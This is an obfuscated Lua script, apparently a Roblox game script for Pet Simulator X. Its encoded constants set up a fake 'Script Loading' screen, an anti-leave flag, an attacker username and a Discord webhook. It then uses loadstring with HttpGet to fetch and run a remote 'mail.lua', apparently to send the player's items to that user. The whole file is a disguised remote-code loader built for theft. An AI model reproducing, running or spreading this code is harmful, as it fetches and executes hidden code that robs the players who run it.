--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v74=0;while true do if (v74==0) then v19=v0(v3(v30,1,1));return "";end end else local v75=v2(v0(v30,16));if v19 then local v81=0;local v82;while true do if (v81==1) then return v82;end if (v81==0) then v82=v5(v75,v19);v19=nil;v81=1;end end else return v75;end end end);local function v20(v31,v32,v33)if v33 then local v76=535 -(158 + 377) ;local v77;while true do if (v76==0) then v77=(v31/((1 + 1)^(v32-(1 -0))))%((6 -4)^(((v33-1) -(v32-(1 -0))) + 1 + (0 -0))) ;return v77-(v77%(1 + 0)) ;end end else local v78=(1735 -(794 + 941)) + 0 ;local v79;while true do if (v78==(1766 -(1479 + 287))) then v79=2^(v32-(2 -1)) ;return (((v31%(v79 + v79))>=v79) and (1 -(0 + 0))) or (0 -0) ;end end end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=0;local v36;local v37;while true do if (v35==(0 + 0)) then v36,v37=v1(v16,v18,v18 + 1 + 1 + 0 );v18=v18 + 2 + 0 ;v35=1 + 0 ;end if (v35==(1 -0)) then return (v37 * ((731 -(353 + 321)) + (1493 -(964 + 330)))) + v36 ;end end end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + 3 );v18=v18 + 3 + 1 ;return (v41 * (16778349 -(654 + 197 + 282))) + (v40 * (66753 -(267 + 950))) + (v39 * 256) + v38 ;end local function v24()local v42=v23();local v43=v23();local v44=1;local v45=(v20(v43,103 -(76 + 26) ,29 -9 ) * ((7 -5)^((2086 -1348) -(216 + 490)))) + v42 ;local v46=v20(v43,40 -19 ,15 + 16 );local v47=((v20(v43,63 -31 )==(1044 -(905 + 138))) and  -(1 -0)) or (1 + 0) ;if (v46==((0 -0) + (1765 -(1653 + 112)))) then if (v45==(0 -0)) then return v47 * ((0 -0) + 0) ;else v46=1 -0 ;v44=0 -0 ;end elseif (v46==(77 + 1970)) then return ((v45==(1211 -(315 + 896))) and (v47 * ((1 -0)/0))) or (v47 * NaN) ;end return v8(v47,v46-(2513 -1490) ) * (v44 + (v45/((1 + 1)^(1627 -(581 + 994))))) ;end local function v25(v48)local v49;if  not v48 then local v80=0 + 0 ;while true do if (v80==(0 -0)) then v48=v23();if (v48==(234 -(151 + 83))) then return "";end break;end end end v49=v3(v16,v18,(v18 + v48) -(1 + 0) );v18=v18 + v48 ;local v50={};for v66=(1233 -(255 + 872)) -(80 + 25) , #v49 do v50[v66]=v2(v1(v3(v49,v66,v66)));end return v6(v50);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=0 + 0 ;local v52;local v53;local v54;local v55;local v56;local v57;local v58;local v59;while true do if (v51==(2 + 0)) then v56=nil;v57=nil;v51=14 -11 ;end if (v51~=(1 -0)) then else v54=nil;v55=nil;v51=2 -0 ;end if (v51==(0 -0)) then v52=0;v53=nil;v51=1 + 0 ;end if (v51~=(404 -(94 + 306))) then else while true do if (v52==(935 -(383 + 552))) then local v93=0 -0 ;while true do if ((0 + 0)~=v93) then else v53=428 -(170 + 258) ;v54=nil;v93=1933 -(1642 + 290) ;end if (v93==(3 -2)) then v52=1333 -(44 + 1288) ;break;end end end if (v52~=3) then else v59=nil;while true do local v100=670 -(634 + 36) ;while true do if (v100==(1 -0)) then if (v53~=2) then else local v106=0 -0 ;while true do if (v106==(3 -2)) then local v109=0 -0 ;while true do if (v109==(0 -0)) then for v127=3 -2 ,v23() do v56[v127]=v23();end return v57;end end end if (v106~=(0 + 0)) then else for v113=331 -(325 + 5) ,v23() do local v114=0;local v115;local v116;while true do if (v114==0) then v115=0;v116=nil;v114=1;end if (1==v114) then while true do if (v115==0) then v116=v21();if (v20(v116,1 + 0 ,1 + 0 )==(866 -(186 + 680))) then local v160=0 -0 ;local v161;local v162;local v163;while true do if (v160==(0 -0)) then local v175=0;while true do if (v175~=0) then else v161=v20(v116,2,1250 -(513 + 734) );v162=v20(v116,186 -(128 + 54) ,2 + 4 );v175=1 + 0 ;end if (v175==1) then v160=1;break;end end end if (v160==(2 + 0)) then local v176=0 -0 ;while true do if (v176==0) then local v187=0 -0 ;while true do if (v187~=(1458 -(1260 + 197))) then else v176=1;break;end if (v187==(0 -0)) then if (v20(v162,3 -2 ,1)~=1) then else v163[7 -5 ]=v59[v163[2]];end if (v20(v162,2 + 0 ,1 + 1 )==1) then v163[3]=v59[v163[5 -2 ]];end v187=40 -(33 + 6) ;end end end if (v176==(1 -0)) then v160=4 -1 ;break;end end end if (v160==(271 -(172 + 96))) then if (v20(v162,3 + 0 ,1 + 2 )~=(2 -1)) then else v163[19 -15 ]=v59[v163[4]];end v54[v113]=v163;break;end if (v160==(1927 -(1879 + 47))) then local v178=0 + 0 ;while true do if (v178~=0) then else v163={v22(),v22(),nil,nil};if (v161==(0 + 0)) then local v190=1770 -(208 + 1562) ;local v191;local v192;local v193;while true do if ((1 + 0)==v190) then v193=nil;while true do if (v191~=0) then else local v205=0 + 0 ;while true do if (v205==(1 + 0)) then v191=621 -(225 + 395) ;break;end if (v205==(0 -0)) then v192=0;v193=nil;v205=1 + 0 ;end end end if (v191~=1) then else while true do if (v192~=(1450 -(1439 + 11))) then else v193=0 + 0 ;while true do if (v193==(0 + 0)) then v163[299 -(114 + 182) ]=v22();v163[1 + 3 ]=v22();break;end end break;end end break;end end break;end if ((613 -(536 + 77))==v190) then v191=0 + 0 ;v192=nil;v190=1045 -(249 + 795) ;end end elseif (v161==(1 + 0)) then v163[2 + 1 ]=v23();elseif (v161==(2 -0)) then v163[2 + 1 ]=v23() -(2^(16 + 0)) ;elseif (v161==(822 -(745 + 74))) then local v206=0 -0 ;local v207;while true do if (v206==(951 -(221 + 730))) then v207=0;while true do if (v207~=(709 -(149 + 560))) then else v163[3]=v23() -((1463 -(1029 + 432))^16) ;v163[158 -(139 + 15) ]=v22();break;end end break;end end end v178=512 -(172 + 339) ;end if (v178==(1954 -(81 + 1872))) then v160=2;break;end end end end end break;end end break;end end end for v117=1 + 0 ,v23() do v55[v117-(1 -0) ]=v28();end v106=1 + 0 ;end end end break;end if (v100==(0 + 0)) then local v105=0 -0 ;while true do if (v105~=(1682 -(55 + 1626))) then else v100=1 + 0 ;break;end if (v105==0) then if (v53==(1559 -(1298 + 261))) then local v110=0;local v111;while true do if (v110==(0 -0)) then v111=0 -0 ;while true do if (v111==0) then v54={};v55={};v111=1 + 0 ;end if (v111==1) then local v154=0 -0 ;while true do if (v154==0) then v56={};v57={v54,v55,nil,v56};v154=710 -(494 + 215) ;end if (v154==(1 -0)) then v111=2;break;end end end if (2~=v111) then else v53=3 -2 ;break;end end break;end end end if (v53==(1 -0)) then local v112=0 + 0 ;while true do if (v112~=(3 -1)) then else v53=1 + 1 ;break;end if (v112==(0 + 0)) then v58=v23();v59={};v112=3 -2 ;end if (v112==(1 + 0)) then for v129=1746 -(181 + 1564) ,v58 do local v130=0 -0 ;local v131;local v132;local v133;local v134;while true do if (v130==(0 -0)) then v131=0 -0 ;v132=nil;v130=1 + 0 ;end if (v130~=(3 -2)) then else v133=nil;v134=nil;v130=2;end if (v130~=(1833 -(935 + 896))) then else while true do if (v131==1) then v134=nil;while true do if (v132~=1) then else if (v133==(1604 -(1385 + 218))) then v134=v21()~=(1344 -(231 + 1113)) ;elseif (v133==(1122 -(270 + 850))) then v134=v24();elseif (v133==(286 -(155 + 128))) then v134=v25();end v59[v129]=v134;break;end if (v132==0) then local v180=0 + 0 ;while true do if (v180==0) then local v188=0 + 0 ;while true do if (v188==(2 -1)) then v180=1;break;end if (v188~=(0 -0)) then else v133=v21();v134=nil;v188=1 -0 ;end end end if (v180~=(1 -0)) then else v132=2 -1 ;break;end end end end break;end if (v131~=(0 -0)) then else local v166=0;local v167;while true do if (v166==(190 -(122 + 68))) then v167=277 -(132 + 145) ;while true do if (v167==(2 -1)) then v131=936 -(351 + 584) ;break;end if (v167==0) then local v189=1528 -(1172 + 356) ;while true do if (1==v189) then v167=3 -2 ;break;end if (v189~=0) then else v132=0 + 0 ;v133=nil;v189=1 -0 ;end end end end break;end end end end break;end end end v57[3 + 0 ]=v21();v112=1114 -(448 + 664) ;end end end v105=1197 -(935 + 261) ;end end end end end break;end if (v52==2) then local v94=0 + 0 ;while true do if ((1904 -(1832 + 72))==v94) then v57=nil;v58=nil;v94=1;end if (v94==(487 -(107 + 379))) then v52=6 -3 ;break;end end end if (v52~=(463 -(227 + 235))) then else local v95=0;while true do if (v95==1) then v52=1395 -(873 + 520) ;break;end if (0==v95) then v55=nil;v56=nil;v95=1;end end end end break;end if ((7 -4)~=v51) then else v58=nil;v59=nil;v51=2 + 2 ;end end end local function v29(v60,v61,v62)local v63=v60[1];local v64=v60[2];local v65=v60[3];return function(...)local v68=0;local v69;local v70;local v71;local v72;local v73;while true do if (v68==0) then v69=1;v70= -1;v68=1;end if (v68==1) then v71={...};v72=v12("#",...) -1 ;v68=2;end if (2==v68) then v73=nil;function v73()local v83=v63;local v84=v64;local v85=v65;local v86=v27;local v87={};local v88={};local v89={};for v96=0,v72 do if ((v96>=v85) or ((952 + 3756)<4060)) then v87[v96-v85 ]=v71[v96 + (1685 -(1682 + 2)) ];else v89[v96]=v71[v96 + (524 -(422 + 101)) ];end end local v90=(v72-v85) + (1 -0) ;local v91;local v92;while true do local v97=118 -(17 + 101) ;local v98;while true do if ((v97==(0 -0)) or ((10883 -8139)<=(3158 -1547))) then v98=0 -(1032 -(618 + 414)) ;while true do if ((v98==(1408 -(1175 + 232))) or ((7362 -4283)<(3158 -(842 + 404)))) then if (((1956 + 507)>1952) and (v92<=(11 -(1667 -(1343 + 319))))) then if ((v92<=2) or (3924<=(1195 + 1508))) then if ((v92<=(699 -(139 + 560))) or ((235 + 2959)<(1375 + 1185))) then if (((3841 -1981)>(2192 -983)) and (v89[v91[1 + 1 + 0 ]]==v91[4])) then v69=v69 + (900 -(11 + 102 + (3489 -2703))) ;else v69=v91[5 -2 ];end elseif ((((717 -(227 + 412)) + 1442)>=(2076 -(1241 + 471))) and (v92>1)) then v89[v91[1047 -(48 + 997) ]]();else do return;end end elseif ((1808<((1415 -(16 + 1201)) + (3789 -1884))) and (v92<=(10 -6))) then if ((v92==(10 -7)) or ((1300 + 772)<=(1908 -(9 + 4)))) then v62[v91[3]]=v89[v91[1798 -(999 + 797) ]];else v89[v91[2]][v91[14 -11 ]]=v91[(639 -(530 + 104)) -(451 -(160 + 290)) ];end elseif ((v92==((3 + 3) -1)) or (1967>(10163 -6430))) then if (((3466 -(9 + (1 -0)))==(10252 -6796)) and (v91[(2 + 0) -0 ]==v89[v91[3 + 1 ]])) then v69=v69 + 1 ;else v69=v91[3 + 0 + 0 ];end else local v140=0 -0 ;local v141;local v142;local v143;local v144;while true do if ((v140==(2 + 0)) or ((5606 -1297)<=(3056 -(420 + (2138 -1188))))) then while true do if (((352 + (5890 -2961))>=(1832 -(525 + 13))) and (v141==(0 -0))) then local v172=1097 -(1093 + 4) ;while true do if ((v172==0) or (((1874 -(229 + 969)) -305)>=(9534 -5256))) then v142=0 + 0 ;v143=nil;v172=1;end if (((539 + 713)==(504 + 748)) and (v172==(1 + 0))) then v141=1;break;end end end if ((((14790 -9850) -2504)>(3436 -1975)) and (v141==(3 -2))) then v144=nil;while true do if ((((2747 -2020) -463)<=(11788 -(7093 + 399))) and (v142==(1 + 0))) then v89[v143 + 1 ]=v144;v89[v143]=v144[v91[401 -((2154 -(409 + 1516)) + 168) ]];break;end if ((v142==(0 -(1630 -(719 + 911)))) or ((5850 -3161)>(4700 -(1937 + 62)))) then local v186=0 + 0 + 0 ;while true do if (((2379 + (1653 -1064))<(9220 -4663)) and (v186==(1 -0))) then v142=1;break;end if (((1972 + 350)<=(588 + (7791 -3838))) and (v186==0)) then local v194=0;while true do if ((v194==(104 -(82 + 21))) or ((4153 -(55 + 233))==(16142 -12314))) then v186=1 + (1012 -(301 + 711)) ;break;end if (((407 + 2122)==(376 + 2153)) and (v194==(1189 -(720 + 469)))) then v143=v91[2 -0 ];v144=v89[v91[3]];v194=872 -(650 + 221) ;end end end end end end break;end end break;end if (((174 + 229)==403) and (v140==(15 -(13 + 1)))) then v143=nil;v144=nil;v140=2 + 0 ;end if (((341 + 171)<2112) and (v140==(0 -0))) then v141=0;v142=nil;v140=1 + 0 ;end end end elseif ((v92<=(52 -(31 + 12))) or ((13506 -8926)<(4014 -((1005 -755) + (2910 -2099))))) then if ((1066>(73 + 817)) and (v92<=7)) then local v120=762 -(99 + 663) ;local v121;local v122;local v123;local v124;local v125;while true do if ((v120==(1348 -(57 + (2849 -(810 + 750))))) or ((4654 -3006)>(5049 -(93 + 29)))) then v125=nil;while true do if ((v121==(1 + 0)) or ((2345 -(520 + 144))<62)) then local v164=0 -0 ;while true do if ((v164==(0 + 0)) or (4817<=(5332 -(687 + 223)))) then v70=(v124 + v122) -((1258 -(595 + 662)) + 0) ;v125=0 + 0 ;v164=1 + 0 ;end if (((725 -(463 + 195))<(940 -((2114 -(1342 + 563)) + 275))) and (v164==(1 + 0))) then v121=2;break;end end end if ((v121==(1 + 1)) or ((6281 -2063)<=(3576 -(326 + 1110)))) then for v168=v122,v70 do local v169=0;local v170;local v171;while true do if ((v169==(1 + 0)) or ((4856 -(557 + 786))==(3398 -(757 + 89)))) then while true do if ((v170==0) or (2982<=(1846 -1276))) then v171=0;while true do if (((0 -0)==v171) or ((57 + 117)<=(126 + (41 -29)))) then v125=v125 + (2 -1) ;v89[v168]=v123[v125];break;end end break;end end break;end if (((273 + 2189)>(2778 -995)) and (v169==(0 + 0 + 0))) then v170=(0 + 0) -0 ;v171=nil;v169=461 -(400 + 60) ;end end end break;end if (((546 + 189)<=(2361 -((2265 -(1627 + 52)) + 442))) and (v121==(0 -0))) then v122=v91[2];v123,v124=v86(v89[v122](v13(v89,v122 + 1 + 0 ,v91[370 -(279 + 88) ])));v121=1;end end break;end if (((1159 + 977)<(535 + 2442)) and (v120==(3 -2))) then v123=nil;v124=nil;v120=2;end if ((v120==((1329 -(67 + 58)) -(422 + 782))) or (((1947 -(176 + 84)) -(459 + 933))==(3345 -2069))) then v121=0 + 0 ;v122=nil;v120=1 -0 ;end end elseif ((v92==(35 -27)) or ((2765 -(64 + 19))<=(2345 -(585 + 34)))) then v69=v91[3];else v89[v91[3 -1 ]]=v91[1 + 1 + 1 ];end elseif ((v92<=(540 -(150 + 379))) or (1053==(4516 -(422 + 626)))) then if (((5458 -(2025 + 30))>=(4784 -(354 + 1181))) and (v92>(602 -(334 + 197 + 61)))) then for v155=v91[2 + 0 ],v91[4 -1 ] do v89[v155]=nil;end else local v148=(2254 -1108) -(801 + 345) ;local v149;local v150;while true do if (((1700 -(457 + 99))<(16294 -12406)) and (v148==(0 -0))) then v149=0;v150=nil;v148=1142 -(501 + 640) ;end if (((29 -(5 + 1 + 22))==v148) or ((5035 -3321)>(2542 -(24 + 83)))) then while true do if ((4306>1918) and ((277 -(140 + (1687 -(32 + 1518))))==v149)) then v150=v91[3 -1 ];v89[v150]=v89[v150](v13(v89,v150 + (1 -0) ,v70));break;end end break;end end end elseif (((4041 -(104 + 810))>=(1152 -653)) and (v92==12)) then v89[v91[1 + 1 ]]=v62[v91[475 -(419 + 53) ]];else v89[v91[1 + 1 ]]=v91[3]~=(189 -(43 + 146)) ;end v69=v69 + (1611 -(455 + 1155)) ;break;end if ((v98==(368 -(208 + 160))) or (1989>(5230 -2477))) then local v107=0 -0 ;local v108;while true do if ((((4701 -(404 + 45)) -(17 + 36))==4199) and (v107==(0 + 0 + 0))) then v108=0 -0 ;while true do if (((4531 -(1263 + 228))<=(2443 + 795)) and (v108==((0 -0) + 0))) then local v126=0 -0 ;while true do if ((v126==(0 + 0)) or (1911<=1232)) then v91=v83[v69];v92=v91[1 + 0 ];v126=488 -(134 + 353) ;end if (((5557 -3656)<=(13399 -9268)) and (v126==(3 -2))) then v108=1476 -(60 + 1415) ;break;end end end if ((v108==(2 -1)) or ((6300 -(1120 + 411))<(1702 + 882))) then v98=1 + 0 ;break;end end break;end end end end break;end end end end v68=3;end if (v68==3) then A,B=v27(v11(v73));if  not A[1] then local v99=v60[4][v69] or "?" ;error("Script error at ["   .. v99   .. "]:"   .. A[2] );else return v13(A,2,B);end break;end end end;end return v29(v28(),{},v17)(...);end v15("LOL!1B3O00028O00027O004003023O005F4703093O00546869726454657874030E3O00416C6D6F737420446F6E653O2E030B3O0057616974696E6754696D65026O002440030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403413O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4D69436B6579536372697074732F5053582F6D61696E2F6D61696C2E6C7561026O00F03F030D3O004C6F6164696E675363722O656E2O0103093O00416E74694C65617665010003083O00557365724E616D6503073O005A68696E78353603073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O31303O31342O39372O30333738303135362F2D5253543937425261526450533356746F2D6769552O6944674655495F6E36673962523754636156307547624546586D57445A3739414C68615277715635344A397A767303093O004D6F7573654C6F636B030A3O005363726970744E616D65030D3O004D69436B65795363726970747303093O0046697273745465787403103O0053637269707420507265706172696E67030A3O005365636F6E645465787403113O00536372697074204C6F6164696E673O2E00443O0012093O00014O000B000100013O000E050001000200013O0004083O00020001001209000100013O00262O00010014000100020004083O0014000100120C000200033O00300400020004000500120C000200033O00300400020006000700120C000200083O00120C000300093O00200600030003000A0012090005000B4O000D000600014O0007000300064O000A00023O00022O00020002000100010004083O0043000100262O0001002A000100010004083O002A0001001209000200013O00262O0002001E0001000C0004083O001E000100120C000300033O0030040003000D000E00120C000300033O0030040003000F0010001209000200023O00262O00020025000100010004083O00250001001209000300123O001203000300113O001209000300143O001203000300133O0012090002000C3O000E0500020017000100020004083O001700010012090001000C3O0004083O002A00010004083O0017000100262O000100050001000C0004083O00050001001209000200013O00262O00020034000100010004083O0034000100120C000300033O00300400030015000E00120C000300033O0030040003001600170012090002000C3O00262O0002003B0001000C0004083O003B000100120C000300033O00300400030018001900120C000300033O0030040003001A001B001209000200023O000E050002002D000100020004083O002D0001001209000100023O0004083O000500010004083O002D00010004083O000500010004083O004300010004083O000200012O00013O00017O00443O00023O00033O00053O00053O00063O00083O00083O00093O00093O000A3O000A3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000C3O000E3O000E3O000F3O00113O00113O00123O00123O00133O00133O00143O00163O00163O00173O00173O00183O00183O00193O001B3O001B3O001C3O001D3O001E3O00213O00213O00223O00243O00243O00253O00253O00263O00263O00273O00293O00293O002A3O002A3O002B3O002B3O002C3O002E3O002E3O002F3O00303O00313O00333O00353O00363O00383O00",v9(),...);end